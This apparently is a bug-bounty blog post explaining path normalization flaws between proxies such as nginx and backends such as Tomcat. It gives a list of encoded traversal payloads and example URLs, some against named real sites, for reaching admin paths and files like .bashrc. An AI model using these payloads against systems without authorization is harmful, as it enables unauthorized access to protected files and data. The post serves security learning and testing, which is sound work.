---
title: Understanding and Exploiting Path Normalization Vulnerabilities
description: bugbounty,hacking
author: samidunimsara
date: 2024-01-12 11:33:00 +0800
categories: [hackingweb, web]
tags: [web,bugbounty]

---


# Path Normalization Vulnerability

## TO DO 
## Overview
The path normalization vulnerability arises from a misconfiguration between the reverse proxy and the Web Application Server (WAS). This vulnerability occurs when an incorrect path in the proxy settings, such as those set by nginx, leads to unintended behavior. For instance, an attacker might insert the string `..;/` into a URL path. If passed to Tomcat, it interprets `..;/` as `../`, allowing the attacker to access directories outside the intended path.

### Example:
Traversing back multiple directories to observe the responses can reveal vulnerabilities. For a particular host, traversing back three directories resulted in a `400 Bad Request`, indicating the traversal went too far down the internal web root.

- Example URL:
  ```
  example.com/de/..;/..;/..;/
  ```

Forward traversal resulted in a `404` page.

- Example URL:
  ```
  https://www.example.com/de/..;/..;/FUZZ
  ```

## Tips & Techniques

### 1. Identifying Root Traversal
When it's challenging to leak the backend URL, a `400 HTTP Status` code can indicate that traversal has passed the root directory.

- Example:
  ```
  host[.]com/test/../../ = 400
  ```

### 2. Path Manipulation
Attempts to access sensitive directories may bypass restrictions:

- Example:
  ```
  host.com/admin     403
  host.com/%2e/admin 200
  ```

Browsing the contents of `/home/dist/.bashrc` could be achieved by manipulating paths:

- Example:
  ```
  https://nodejs.org/metrics../.bashrc
  ```

Accessing protected resources:
- Example:
  ```
  admin/path/test.html         403 
  admin/path/for/../test.html  200 OK
  ```

### 3. Exploiting Misconfigurations
Path normalization issues can be exploited to access unauthorized resources.

- Test Case:
  ```
  https://exampledotcom/path/..;/api/9/nginx
  ```

### 4. Apache & Tomcat Considerations
When dealing with Apache or Tomcat, specific configurations or default installations may introduce vulnerabilities:

- Example:
  ```
  /..;/examples/servlets/servlet/SessionExample
  ```

Accessing a resource after normalization:
- Example:
  ```
  https://odyssey-lift-off-rest-api.herokuapp.com/author/1/../../anotherresouce/2
  ```

### 5. Recon Tips
- Start recon with Chrome DevTools, filtering for Fetch/XHR and Docs to reduce noise.
- Use tools like `ffuf` to identify path traversal vulnerabilities with various payloads.

## Common Payloads for Path Traversal:
```text
../
..%2f
..%252f
%2e%2e%2f
%252e%252e%252f
..;a=a/
..%01/
..%0a/
..%0b/;.css
..//
...//
.../
..;/
..\
...\
..%5c
..%255c
..%255c\
%2e%2e%5c
%252e%252e%255c
..\/
../\
./
...
```

## Advanced Exploits
### 1. Bypassing Access Control
An advanced example of access control bypass using Apache colon path traversal:
```text
https://rampadmin.apple.com/admin/healthcheck/..;/data/existing_UAT_DS_App_Ids.json → 200 OK
```

### 2. CDN and Backend Normalization Differences
An issue where Cloudflare’s CDN normalized the path differently than the backend server, leading to unintended access:
```text
/share/%2F..%2F/api/auth/session
```

### 3. Nginx Off-by-Slash
Nginx configuration mistakes can allow access to restricted files:
```text
http://127.0.0.1/static../settings.py
```

### 4. Recon Example
Finding interesting API endpoints during recon with tools like `ffuf`:
```text
/experience/..;/
/experience/../
/experience/..%2f
/experience/%2e%2e%2f
```

## References:
- [Breaking Parser Logic](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)
- [Huntr Tutorial](https://huntr.com/get-started/tutorial)
- [Avatao Module](https://next.avatao.com/modules/custom)
```
